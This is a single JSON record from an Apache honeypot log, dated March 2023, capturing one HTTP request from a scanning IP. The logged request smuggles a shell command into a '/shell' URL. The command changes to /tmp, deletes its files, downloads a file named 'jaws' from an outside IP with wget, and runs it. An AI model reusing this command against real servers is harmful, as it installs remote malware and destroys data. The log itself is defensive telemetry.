{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Fri Mar  3 10:41:01 UTC 2023","parsedMessage":{"timestamp":"2023-03-03 10:40:31+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"176.58.113.181 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.132/jaws;sh+/tmp/jaws\" 400 0 \"-\" \"-\"","ip":"176.58.113.181"},"id":"d6fe0157-4106-4143-a416-af5f64106c1c","EventProcessedUtcTime":"2023-03-03T10:41:01.9613281Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-03T10:41:01.7430000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/176.58.113.181"}